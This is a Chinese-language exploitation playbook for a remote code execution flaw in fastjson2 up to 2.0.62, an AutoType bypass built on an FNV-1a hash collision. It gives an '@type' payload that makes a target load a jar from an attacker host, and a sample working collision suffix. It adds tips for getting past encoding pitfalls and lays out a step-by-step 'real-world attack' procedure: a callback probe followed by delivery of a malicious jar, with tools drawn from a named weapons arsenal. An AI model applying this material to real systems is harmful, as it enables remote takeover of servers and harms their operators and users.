# Fastjson2 FNV-1a 碰撞 AutoType 绕过 RCE 案例（2026-08）

## 漏洞要点（长亭 2026-07-27 通告 + 源码 2.0.62 实证）
- fastjson2 <= 2.0.62；修复 PR #7695（2.0.63+）；默认配置（SafeMode OFF）可打；全 JDK（8~21）；无需目标存在危险类
- 根因: `ObjectReaderProvider.checkAutoType()` 的 !autoTypeSupport 分支逐字符算增量 FNV-1a 哈希，
  `Arrays.binarySearch(acceptHashCodes, hash)` 命中后**直接 loadClass(完整typeName) 不校验前缀文本**
- 默认白名单哈希唯一: `-6293031534589903644`（无符号 0xa8aaa929446ffce4）
- 利用链: `{"@type":"jar:http://<attacker>/x.jar!/<FNV碰撞后缀>"}` → checkAutoType 命中 → loadClass
  → 目标类加载器识别 jar:http → 下载 jar → defineClass → 静态块 RCE

## 碰撞后缀（可复用方法）
- FNV-1a 可逆（MAGIC_PRIME=0x100000001b3 模 2^64 有乘法逆元）; 4 字符方案: 枚举前 3 char + 逆推第 4，搜索空间 2^48
- **后缀与前缀强绑定**（增量哈希从头算）: 换 IP/端口/路径/文件名必须重搜
- 验证碰撞: Python 复算增量哈希看是否命中 0xa8aaa929446ffce4（秒级）; 已知有效示例:
  `jar:http://127.0.0.1:19090/probe_echo.jar!/\u23df\u96f2\ud880\udfb7`（位置 47 命中）
- Go CPU 搜索器编译: `go build collision_search.go`; selftest 模式验证搜索链路; -start/-end 按 c0 分片多机并行
- 无 GPU 时 CPU 全搜按小时计; CUDA 版需 nvcc

## 触发形态矩阵（本地端到端实测, 2.0.20~2.0.62 多版本）
| 形态 | 触发 |
|---|---|
| 顶层 `{"@type":"jar:...!/<碰撞>"}` parseObject(String) | ✅ 全版本稳定（~200-300ms 时间差） |
| DTO `Set<Object>` 字段 + `{"x":Set[{"@type":...}]}` 语法 | ✅ 首次解析必触发（独立 JVM 5/5） |
| DTO Set<Object> + 数组语法 / List / Map / Object 字段 | ❌ |
| 裸 parseObject(String) 顶层 Set 嵌套（无 DTO） | ❌（@type 当普通字段） |

**缓存坑**: fastjson2 对同一 typeName 失败也缓存 → 同一 JVM 第二次用相同 typeName 不再触发。
同 JVM 重复验证会假阴性; 攻击只需发一次; 每个目标 JVM 独立不受影响。
**JSON 转义坑（关键）**: 碰撞后缀含代理对（\ud800-\udfff）时，JSON `\uXXXX` 转义发送会被
fastjson2 还原时变换 → 碰撞失效（实测 277ms vs 0ms）。**必须合并代理对为 code point 后 UTF-8 裸字符发送**
（Python: merge_surrogates + json.dumps(ensure_ascii=False) + encode('utf-8')）。

## 类加载器前置（本洞唯一硬门槛, 实测全灭标准环境）
`TypeUtils.loadClass` 调用链: contextClassLoader.loadClass → JSON 类加载器 → Class.forName → null;
**全程无 new URL/getResourceAsStream/URLClassLoader**（与 fastjson1 CVE-2026-16723 的 getResourceAsStream
路径机制不同, 不可搬 fat-jar 前置）。
实测: 裸 main / Spring Boot fat-jar 2.7.18 (LaunchedURLClassLoader) / URLClassLoader 挂 jar:http URL classpath
→ loadClass("jar:http://...") 全 CNFE 无回连（2-24ms）。
**能打的环境 = 类加载器被魔改支持 jar:http 远程加载**: 国产中间件（东方通/金蝶天燕/宝兰德）、插件化/低代码平台。
长亭"全 JDK 通杀"仅指 JDK 版本维度，环境维度通告未披露——实战前必须回连探测确认。

## 实战打法
1. 搭回调（HTTP 监听托管桩 jar + 记录请求）
2. 按回调前缀重搜碰撞后缀 → 写入 payload/jar_type.txt
3. 发探测: top 形态（通用）/ set 形态（DTO 接口）; 回调收到 jar 请求 = 环境成立 → 上完整恶意 jar
4. 恶意 jar 自建不外传; jar 内类静态块执行

## 收录产物（武器库\fastjson2-FNV碰撞AutoType绕过RCE\）
- `fj2_jar_fnv_probe.py`: --probe（零外连指纹）/ --callback（回连探测）/ --shape top|set / --type-name
- `collision_search/`: Go CPU + CUDA 搜索器、XEcho.java 恶意类示例、serve.py 托管、使用说明
- `payload/jar_type.txt`: @type 值外置（JSON 字符串字面量格式, POC 用 json.loads 解析）
- 0day.md: 源码级根因/触发矩阵/前置条件/坑清单

## 验证方法（可复用）
- 触发判定用**时间差**（碰撞 200-300ms vs 非碰撞 0-10ms, = loadClass 三次类加载器 CNFE 开销）
- 端到端: com.sun.net.httpserver 接收端 + parseObject + 打印耗时; POC 真实发送确认 TRIGGERED
- 碰撞后缀 Python 复算验证（h = ((h ^ c) * P) % 2**64）
- 类加载器行为: 最小 Java 程序直接调 contextClassLoader.loadClass 测回连（绕开碰撞搜索, 快速判定环境）
